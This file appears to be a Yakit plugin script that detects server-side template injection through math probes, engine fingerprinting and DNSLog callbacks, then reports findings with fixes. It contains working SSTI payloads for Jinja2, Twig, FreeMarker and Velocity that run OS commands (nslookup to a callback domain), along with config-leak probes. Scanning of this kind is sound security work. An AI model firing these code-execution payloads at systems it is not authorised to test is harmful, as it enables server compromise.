__DESC__ = "服务器端模板注入 (SSTI) 检测工具，支持 Jinja2/Twig/FreeMarker/Velocity/Thymeleaf 等主流模板引擎，通过数学表达式探测、引擎指纹识别和 DNSLog 带外验证三阶段检测"
__VERBOSE_NAME__ = "SSTI 服务器端模板注入检测"
__KEYWORDS__ = "ssti,template-injection,jinja2,twig,freemarker,velocity,thymeleaf,rce"

// 配置项
debug = false
threads = 5  // SSTI 检测较慢，降低并发

// -------------------------------------------------------------------
// CLI 参数定义
// -------------------------------------------------------------------
flowIDStr = cli.String(
    "httpflow-id",
    cli.setVerboseName("HTTPFlowID"),
    cli.setHelp("History 中的 HTTPFlow ID,用于获取请求/响应包内容"),
    cli.setRequired(true),
)
cli.check()

// 辅助输出函数
aiOut = msg => {
    try {
        yakit.AIOutput(msg)
    } catch {
        println(msg)
    }
}

// -------------------------------------------------------------------
// 核心数据结构: Payload 定义
// -------------------------------------------------------------------

// 阶段1: 通用数学表达式探测 Payload
mathPayloads = [
    // {{}} 语法 - Jinja2, Twig, Nunjucks
    {
        "payload": "{{7*7}}",
        "expected": "49",
        "engines": ["Jinja2", "Twig", "Nunjucks"],
        "desc": "双花括号数学运算"
    },
    {
        "payload": "{{7*'7'}}",
        "expected": "7777777",
        "engines": ["Jinja2"],
        "desc": "Jinja2 字符串重复"
    },

    // ${} 语法 - FreeMarker, Velocity, Thymeleaf
    {
        "payload": "${7*7}",
        "expected": "49",
        "engines": ["FreeMarker", "Velocity", "Thymeleaf"],
        "desc": "美元符号数学运算"
    },

    // <%= %> 语法 - ERB, EJS
    {
        "payload": "<%= 7*7 %>",
        "expected": "49",
        "engines": ["ERB", "EJS"],
        "desc": "ERB/EJS 数学运算"
    },

    // #{} 语法 - Spring EL
    {
        "payload": "#{7*7}",
        "expected": "49",
        "engines": ["Spring EL"],
        "desc": "Spring 表达式语言"
    },

    // {} 语法 - Smarty
    {
        "payload": "{7*7}",
        "expected": "49",
        "engines": ["Smarty"],
        "desc": "Smarty 数学运算"
    },
]

// 阶段2: Jinja2 (Python Flask/Django) 指纹识别
jinja2Payloads = [
    {
        "payload": "{{7*'7'}}",
        "expected": "7777777",
        "desc": "字符串重复特征"
    },
    {
        "payload": "{{'abc'.upper()}}",
        "expected": "ABC",
        "desc": "字符串方法调用"
    },
    {
        "payload": "{{config}}",
        "regex": `<Config|SECRET_KEY|DEBUG`,
        "desc": "Flask Config 对象泄露"
    },
    {
        "payload": "{{''.__class__.__mro__[1].__subclasses__()}}",
        "regex": `<class|function|module`,
        "desc": "Python 对象基类访问"
    },
]

// 阶段2: Twig (PHP Symfony) 指纹识别
twigPayloads = [
    {
        "payload": "{{7*'7'}}",
        "expected": "49",
        "desc": "Twig 会将字符串转整数"
    },
    {
        "payload": "{{\"abc\"|upper}}",
        "expected": "ABC",
        "desc": "Twig 过滤器"
    },
    {
        "payload": "{{_self}}",
        "regex": `__TwigTemplate_|Twig`,
        "desc": "Twig 模板对象"
    },
    {
        "payload": "{{\"abc\"~\"xyz\"}}",
        "expected": "abcxyz",
        "desc": "Twig 字符串拼接"
    },
]

// 阶段2: FreeMarker (Java) 指纹识别
freemarkerPayloads = [
    {
        "payload": "${7*7}",
        "expected": "49",
        "desc": "基础数学运算"
    },
    {
        "payload": "${\"abc\"?upper_case}",
        "expected": "ABC",
        "desc": "FreeMarker 内置函数"
    },
    {
        "payload": "${.now?string(\"yyyy-MM-dd\")}",
        "regex": `\d{4}-\d{2}-\d{2}`,
        "desc": "获取当前日期"
    },
    {
        "payload": "${.version}",
        "regex": `\d+\.\d+\.\d+`,
        "desc": "FreeMarker 版本号"
    },
]

// 阶段2: Velocity (Java) 指纹识别
velocityPayloads = [
    {
        "payload": "#set($x=7*7)$x",
        "expected": "49",
        "desc": "Velocity 变量赋值"
    },
    {
        "payload": "#set($str=\"abc\")$str.toUpperCase()",
        "expected": "ABC",
        "desc": "Velocity 方法调用"
    },
]

// 阶段2: Thymeleaf (Java Spring) 指纹识别
thymeleafPayloads = [
    {
        "payload": "[[${7*7}]]",
        "expected": "49",
        "desc": "Thymeleaf 内联表达式"
    },
    {
        "payload": "[(${7*7})]",
        "expected": "49",
        "desc": "Thymeleaf 文本内联"
    },
]

// 阶段2: Smarty (PHP) 指纹识别
smartyPayloads = [
    {
        "payload": "{7*7}",
        "expected": "49",
        "desc": "Smarty 数学运算"
    },
    {
        "payload": "{\"abc\"|upper}",
        "expected": "ABC",
        "desc": "Smarty 修饰器"
    },
]

// -------------------------------------------------------------------
// 核心逻辑: 阶段1 - 数学表达式探测
// -------------------------------------------------------------------

testMathExpression = func(param) {
    aiOut("  [1/3] 数学表达式探测...")

    for i, p = range mathPayloads {
        aiOut(sprintf("    [%d/%d] 测试: %s", i+1, len(mathPayloads), p.payload))

        freq = param.Fuzz(p.payload)
        res, err = freq.ExecFirst()

        if res == nil { continue }

        body, err = str.ExtractBodyFromHTTPResponseRaw(res.ResponseRaw)
        if err != nil { continue }

        bodyStr = string(body)

        // 检查是否有计算结果回显
        if str.Contains(bodyStr, p.expected) {
            aiOut(sprintf("    ✓ 检测到模板注入: %s → %s", p.payload, p.expected))
            aiOut(sprintf("    → 可能引擎: %v", p.engines))

            return {
                "vulnerable": true,
                "payload": p.payload,
                "expected": p.expected,
                "engines": p.engines,
                "desc": p.desc,
                "request": res.RequestRaw,
                "response": res.ResponseRaw
            }
        }
    }

    aiOut("    × 未检测到模板注入特征")
    return nil
}

// -------------------------------------------------------------------
// 核心逻辑: 阶段2 - 引擎指纹识别
// -------------------------------------------------------------------

testEngineFingerprint = func(param, engineName) {
    aiOut(sprintf("  [2/3] 引擎指纹识别: %s", engineName))

    payloads = []

    if engineName == "Jinja2" {
        payloads = jinja2Payloads
    } else if engineName == "Twig" {
        payloads = twigPayloads
    } else if engineName == "FreeMarker" {
        payloads = freemarkerPayloads
    } else if engineName == "Velocity" {
        payloads = velocityPayloads
    } else if engineName == "Thymeleaf" {
        payloads = thymeleafPayloads
    } else if engineName == "Smarty" {
        payloads = smartyPayloads
    } else {
        return nil
    }

    for i, p = range payloads {
        aiOut(sprintf("    [%d/%d] 测试: %s", i+1, len(payloads), p.desc))

        freq = param.Fuzz(p.payload)
        res, err = freq.ExecFirst()

        if res == nil { continue }

        body, err = str.ExtractBodyFromHTTPResponseRaw(res.ResponseRaw)
        if err != nil { continue }

        bodyStr = string(body)
        matched = false

        // 检查期望值或正则匹配
        if p["expected"] != nil {
            matched = str.Contains(bodyStr, p.expected)
        } else if p["regex"] != nil {
            matched = str.MatchAnyOfRegexp(bodyStr, p.regex)
        }

        if matched {
            aiOut(sprintf("    ✓ 确认引擎: %s (%s)", engineName, p.desc))

            return {
                "confirmed": true,
                "engine": engineName,
                "payload": p.payload,
                "desc": p.desc,
                "request": res.RequestRaw,
                "response": res.ResponseRaw
            }
        }
    }

    aiOut(sprintf("    × %s 指纹未匹配", engineName))
    return nil
}

// -------------------------------------------------------------------
// 核心逻辑: 阶段3 - DNSLog 带外验证
// -------------------------------------------------------------------

testDNSLog = func(param, engineName) {
    aiOut("  [3/3] DNSLog 带外验证...")

    server, token, err := risk.NewDNSLogDomain()
    if err != nil {
        aiOut(sprintf("  ! DNSLog 服务不可用: %v", err))
        return nil
    }

    randPrefix = str.RandStr(6)
    testDomain = randPrefix + "." + server

    aiOut(sprintf("  → DNSLog 域名: %s", testDomain))

    // 根据引擎类型构造 DNSLog Payload
    payload = ""

    if engineName == "Jinja2" {
        // Jinja2: 使用 os.popen
        payload = sprintf("{{config.__class__.__init__.__globals__['os'].popen('nslookup %s').read()}}", testDomain)
    } else if engineName == "Twig" {
        // Twig: 使用 system filter
        payload = sprintf("{{['nslookup %s']|filter('system')}}", testDomain)
    } else if engineName == "FreeMarker" {
        // FreeMarker: 使用 Execute
        payload = sprintf("<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"nslookup %s\")}", testDomain)
    } else if engineName == "Velocity" {
        // Velocity: 使用 Runtime
        payload = sprintf("#set($rt=$class.inspect(\"java.lang.Runtime\").type.getRuntime())#set($proc=$rt.exec(\"nslookup %s\"))$proc", testDomain)
    } else {
        aiOut(sprintf("  ! 引擎 %s 暂不支持 DNSLog 验证", engineName))
        return nil
    }

    aiOut(sprintf("  → 发送 DNSLog Payload: %s", payload))

    freq = param.Fuzz(payload)
    res, err = freq.ExecFirst()

    aiOut("  ⏳ 等待 DNSLog 响应（5秒）...")
    sleep(5)

    records, _ := risk.CheckDNSLogByToken(token)

    if len(records) > 0 {
        aiOut(sprintf("  ✓ DNSLog 收到回调: %d 条记录（已确认 SSTI）", len(records)))

        result = {
            "confirmed": true,
            "method": "dnslog",
            "engine": engineName,
            "domain": testDomain,
            "records": records,
            "payload": payload
        }

        if res != nil {
            result["request"] = res.RequestRaw
            result["response"] = res.ResponseRaw
        }

        return result
    } else {
        aiOut("  × DNSLog 未收到回调")
        return nil
    }
}

// -------------------------------------------------------------------
// 核心逻辑: 综合检测流程
// -------------------------------------------------------------------

fuzzSSTI = func(url, param) {
    aiOut(sprintf("\n正在检测参数: %s (%s)", param.Name(), param.PositionVerbose()))

    // 阶段1: 数学表达式探测
    mathResult = testMathExpression(param)

    confirmedResult = nil
    potentialEngines = []

    // 如果阶段1成功，使用检测到的引擎列表
    if mathResult != nil {
        potentialEngines = mathResult.engines

        // 阶段2: 引擎指纹识别
        for _, engine = range potentialEngines {
            result = testEngineFingerprint(param, engine)
            if result != nil && result.confirmed {
                confirmedResult = result
                break
            }
        }
    } else {
        // 阶段1失败（无回显），尝试常见引擎
        aiOut("  → 数学表达式未检测到回显，尝试常见引擎...")
        potentialEngines = ["Jinja2", "Twig", "FreeMarker", "Velocity"]
    }

    // 如果指纹识别失败或阶段1失败，尝试 DNSLog 带外验证
    if confirmedResult == nil {
        aiOut("  → 尝试 DNSLog 带外验证...")

        for _, engine = range potentialEngines {
            dnsResult = testDNSLog(param, engine)
            if dnsResult != nil && dnsResult.confirmed {
                confirmedResult = dnsResult
                break
            }
        }
    }

    // 如果所有检测都失败
    if confirmedResult == nil {
        // 如果阶段1有结果，返回疑似漏洞
        if mathResult != nil {
            aiOut("  ⚠ 检测到可疑模板注入，但无法确认具体引擎")
            return {
                "confirmed": false,
                "suspicious": true,
                "engine": "Unknown",
                "payload": mathResult.payload,
                "desc": mathResult.desc,
                "request": mathResult.request,
                "response": mathResult.response
            }
        }
        // 完全没检测到
        return nil
    }

    return confirmedResult
}

// -------------------------------------------------------------------
// 核心逻辑: 风险上报
// -------------------------------------------------------------------

reportSSTI = func(url, param, result) {
    engine = result.engine
    confirmed = result["confirmed"] || false
    suspicious = result["suspicious"] || false

    severity = "critical"
    title = ""
    description = ""

    if confirmed {
        title = sprintf("SSTI (Confirmed - %s): %s", engine, url)
        description = sprintf("参数 %s 存在服务器端模板注入 (SSTI) 漏洞，检测到模板引擎: %s。\n\n攻击者可通过模板注入执行任意代码，获取服务器权限、读取敏感文件或进行横向移动。\n\n检测方法: %s\nPayload: %s",
            param.Name(),
            engine,
            result["desc"] || result["method"] || "指纹识别",
            result.payload
        )
    } else if suspicious {
        title = sprintf("SSTI (Suspicious): %s", url)
        description = sprintf("参数 %s 检测到疑似模板注入特征，但无法确认具体引擎。\n\n建议人工验证是否存在真实漏洞。\n\nPayload: %s",
            param.Name(),
            result.payload
        )
        severity = "high"
    }

    solution = `1. 禁止用户输入直接进入模板渲染上下文。
2. 使用沙箱模式（如 Jinja2 的 SandboxedEnvironment）。
3. 对用户输入进行严格的白名单验证和转义。
4. 禁用模板引擎的危险函数（如 exec、eval、import）。
5. 使用最新版本的模板引擎，修复已知漏洞。
6. 实施 Web 应用防火墙 (WAF) 规则拦截模板注入攻击。`

    aiOut(sprintf("✓ %s", title))

    risk.NewRisk(
        url,
        risk.title(title),
        risk.titleVerbose(sprintf("服务器端模板注入漏洞 (SSTI - %s)", engine)),
        risk.type("ssti"),
        risk.severity(severity),
        risk.payload(result.payload),
        risk.request(result.request),
        risk.response(result.response),
        risk.description(description),
        risk.solution(solution),
        risk.details({
            "engine": engine,
            "confirmed": confirmed,
            "suspicious": suspicious,
            "payload_desc": result["desc"] || "",
            "param_name": param.Name(),
            "param_position": param.PositionVerbose(),
            "detection_method": result["method"] || "fingerprint"
        })
    )
}

// -------------------------------------------------------------------
// 辅助函数: 参数过滤
// -------------------------------------------------------------------

shouldSkipParam = func(paramName) {
    // 跳过明显不可能的参数
    skipPatterns = [
        "(?i)^(id|page|limit|offset|sort|order)$",
        "(?i)^(csrf|token|timestamp|nonce|_token)$",
        "(?i)^(submit|action|method|format)$",
        "(?i)^(PHPSESSID|JSESSIONID|_ga|_gid)$",
    ]

    for _, pattern = range skipPatterns {
        if str.MatchAnyOfRegexp(paramName, pattern) {
            return true
        }
    }
    return false
}

// -------------------------------------------------------------------
// 主程序入口
// -------------------------------------------------------------------

flowID = parseInt(flowIDStr)
flowsChan := db.QueryHTTPFlowsByID(flowID)
flow = nil
for f := range flowsChan {
    flow = f
    break
}

if flow == nil {
    aiOut(sprintf("HTTPFlow 查询失败: 未找到 ID 为 %v 的请求", flowID))
    return
}

reqBytes = flow.GetRequest()
if reqBytes == nil { reqBytes = []byte(flow.Request) }
if reqBytes == nil || len(reqBytes) == 0 {
    aiOut("请求包为空,无法检测")
    return
}

isHttps = flow.IsHTTPS
freq, err := fuzz.HTTPRequest(reqBytes, fuzz.https(isHttps))
if err != nil {
    aiOut(sprintf("解析请求失败: %v", err))
    return
}

aiOut(sprintf("开始 SSTI 漏洞检测 (Target: %s)...", flow.Url))

allParams = freq.GetCommonParams()
validParams = []

for param in allParams {
    if !shouldSkipParam(param.Name()) {
        validParams = append(validParams, param)
    }
}

if len(validParams) == 0 {
    aiOut("未发现可测试的有效参数")
    return
}

aiOut(sprintf("发现 %d 个有效参数，开始检测...", len(validParams)))

// 执行检测
foundCount = 0
for param in validParams {
    result = fuzzSSTI(flow.Url, param)

    if result != nil {
        reportSSTI(flow.Url, param, result)
        foundCount++
    }
}

if foundCount > 0 {
    aiOut(sprintf("\n=== SSTI 检测完成，发现 %d 个漏洞 ===", foundCount))
} else {
    aiOut("\n=== SSTI 检测完成，未发现漏洞 ===")
}
